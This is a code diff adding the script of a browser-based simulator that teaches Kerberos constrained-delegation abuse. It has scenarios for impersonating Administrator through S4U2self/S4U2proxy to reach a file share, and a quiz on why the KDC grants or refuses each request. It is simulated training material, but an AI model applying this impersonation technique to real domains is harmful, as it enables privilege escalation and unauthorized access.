+    markStep('use',!!S.proxy,false);
+
+    $('[data-run="self"]').disabled=!S.tgt;
+    $('[data-run="proxy"]').disabled=!S.tgt || !evidenceTicket();
+    $$('[data-use]').forEach(function(b){
+      b.disabled=!S.proxy;
+    });
+
+    setStatus('tgt', S.tgt ? '<span style="color:var(--ok)">✓ TGT in hand for LON-WS-1$</span>' : '');
+    setStatus('self', S.self ? '<span style="color:'+(selfFwd?'var(--ok)':'var(--bad)')+'">'
+      + (selfFwd?'✓ forwardable':'✗ not forwardable')+' — '+esc(S.self.user)+' → LON-WS-1$</span>' : '');
+    setStatus('proxy', S.proxy ? '<span style="color:var(--ok)">✓ '+esc(S.proxy.user)+' → '+esc(S.proxy.serviceName)+'</span>'
+      : (S.lastChecks && !S.lastOk ? '<span style="color:var(--bad)">✗ refused — read the checklist</span>' : ''));
+    setStatus('use', S.proxy ? '' : '<span style="color:var(--muted)">needs a ticket from step 3</span>');
+
+    var items=[];
+    if(S.tgt) items.push(ticketHtml(S.tgt));
+    if(S.self) items.push(ticketHtml(S.self));
+    if(S.proxy) items.push(ticketHtml(S.proxy));
+    $('#tray').innerHTML = items.length ? items.join('') : '<div class="empty">No tickets yet. Start with step 1.</div>';
+
+    renderVerdict();
+  }
+
+  function syncControls(){
+    $('#target').value=S.target;
+    $('#pt').checked=S.pt;
+    $('#imp').value=S.imp;
+    $('#sens').checked=S.sensitive;
+    $('#ev').value=S.ev;
+    if(S.ev!=='s4u'){ var d=$('#adv'); if(d) d.open=true; }
+  }
+  function resetTickets(){
+    S.tgt=null; S.self=null; S.proxy=null; S.lastChecks=null; S.lastOk=false;
+    clearLog(); render();
+  }
+
+  var SCEN={
+    easy:{ target:'cifs/lon-fs-1', pt:true, imp:'Administrator', sensitive:false, ev:'s4u' },
+    hard:{ target:'cifs/lon-fs-1', pt:false, imp:'Administrator', sensitive:false, ev:'captured' },
+    blocked:{ target:'ldap/lon-dc-1', pt:true, imp:'Administrator', sensitive:false, ev:'s4u' },
+    sensitive:{ target:'cifs/lon-fs-1', pt:true, imp:'svc_sql', sensitive:true, ev:'s4u' }
+  };
+
+  $('#scenBtns').addEventListener('click',function(e){
+    var b=e.target.closest('button'); if(!b) return;
+    var s=SCEN[b.getAttribute('data-scen')]; if(!s) return;
+    Object.keys(s).forEach(function(k){ S[k]=s[k]; });
+    $$('#scenBtns button').forEach(function(x){ x.setAttribute('aria-pressed', x===b ? 'true':'false'); });
+    resetTickets(); syncControls();
+    logLine('sys','[*] Scenario loaded. Read the controls, then run step 1.');
+  });
+  $('#reset').addEventListener('click',function(){ resetTickets(); });
+
+  $('#target').addEventListener('change',function(e){ S.target=e.target.value; S.proxy=null; S.lastChecks=null; render(); });
+  $('#pt').addEventListener('change',function(e){ S.pt=e.target.checked; S.self=null; S.proxy=null; S.lastChecks=null; render(); });
+  $('#imp').addEventListener('change',function(e){ S.imp=e.target.value; S.self=null; S.proxy=null; S.lastChecks=null; render(); });
+  $('#sens').addEventListener('change',function(e){ S.sensitive=e.target.checked; S.self=null; S.proxy=null; S.lastChecks=null; render(); });
+  $('#ev').addEventListener('change',function(e){ S.ev=e.target.value; S.proxy=null; S.lastChecks=null; render(); });
+
+  $$('[data-run]').forEach(function(b){
+    b.addEventListener('click',function(){
+      var k=b.getAttribute('data-run');
+      if(k==='tgt') runTgt();
+      else if(k==='self') runSelf();
+      else if(k==='proxy') runProxy();
+    });
+  });
+  $$('[data-use]').forEach(function(b){
+    b.addEventListener('click',function(){
+      var need=b.getAttribute('data-use');
+      useRes(need, need==='cifs/lon-fs-1' ? '\\\\lon-fs-1\\c$' : '\\\\lon-dc-1\\SYSVOL');
+    });
+  });
+
+  syncControls(); render();
+  logLine('sys','[*] Ready. You are on LON-WS-1. Run step 1.');
+
+  /* ── 7 · quiz ──────────────────────────────────────────────────────────── */
+  var QUIZ=[
+    { q:'Protocol transition is ON. S4U2self returns a forwardable ticket for Administrator. You ask for cifs/lon-fs-1, which is on msDS-AllowedToDelegateTo.',
+      allow:true,
+      why:'All three rules pass. The evidence is addressed to LON-WS-1$, it is forwardable, and the target SPN is listed. The KDC issues Administrator → cifs/lon-fs-1.' },
+    { q:'Protocol transition is OFF. S4U2self returns a ticket for Administrator with no forwardable flag. You ask for cifs/lon-fs-1, which IS on the list.',
+      allow:false,
+      why:'Denied on rule 2. The evidence is not forwardable, so S4U2proxy returns KDC_ERR_BADOPTION. The whitelist is fine — this is the trap: people re-check the SPN when the fault is the ticket. Fix: supply a captured forwardable ticket via /tgs.' },
+    { q:'Protocol transition is ON. The evidence ticket is forwardable. You ask for ldap/lon-dc-1.',
+      allow:false,
+      why:'Denied on rule 3. ldap/lon-dc-1 is not in msDS-AllowedToDelegateTo. One configured SPN on the same host does not imply the others.' },
+    { q:'Protocol transition is OFF. You captured a forwardable HTTP/lon-ws-1 ticket for dyork. You ask for cifs/lon-fs-1, which IS on the list.',
+      allow:true,
+      why:'Allowed. This is case B: the KDC itself issued that ticket with forwardable set, and it is addressed to the requesting service. S4U2proxy trades it. This is exactly what /tgs does.' },
+    { q:'Protocol transition is ON. The evidence ticket is forwardable, but it is an HTTP/lon-ws-2 ticket for dyork. You ask LON-WS-1$ for cifs/lon-fs-1.',
+      allow:false,
+      why:'Denied on rule 1. Evidence must have been issued to the service making the request. A ticket for another host proves nothing about LON-WS-1$.' },
+    { q:'Protocol transition is ON, the SPN is listed, and the evidence is forwardable — but the victim is a member of Protected Users.',
+      allow:false,
+      why:'Denied on rule 2, before you get there: the KDC never sets forwardable on an S4U2self ticket for a sensitive account. You can only impersonate users who are not protected.' }
+  ];
+  function renderQuiz(){
+    var html='';
+    QUIZ.forEach(function(item,i){
+      html+='<div class="q" data-i="'+i+'"><p class="qt">'+(i+1)+'. '+esc(item.q)+'</p>'
+        + '<div class="ansrow"><button type="button" data-ans="allow">Allow</button>'
+        + '<button type="button" data-ans="deny">Deny</button></div>'
+        + '<div class="fb"></div></div>';
+    });
+    $('#quiz').innerHTML=html;
+  }
+  renderQuiz();
+  $('#quiz').addEventListener('click',function(e){
+    var b=e.target.closest('button[data-ans]'); if(!b) return;
+    var card=b.closest('.q'); if(!card || card.hasAttribute('data-done')) return;
+    var item=QUIZ[+card.getAttribute('data-i')];
+    var said=b.getAttribute('data-ans')==='allow';
+    card.setAttribute('data-done','1');
+    $$('.ansrow button',card).forEach(function(x){
+      x.disabled=true;
+      x.classList.add((x.getAttribute('data-ans')==='allow')===item.allow ? 'correct' : 'wrong');
+    });
+    var fb=card.querySelector('.fb');
+    var correct=(said===item.allow);
+    fb.innerHTML='<span class="tag '+(correct?'ok':'bad')+'">'+(correct?'Correct.':'Not quite.')+'</span> '+item.why;
+    fb.classList.add('show');
+  });
+})();
+</script>
+</body>
+</html>
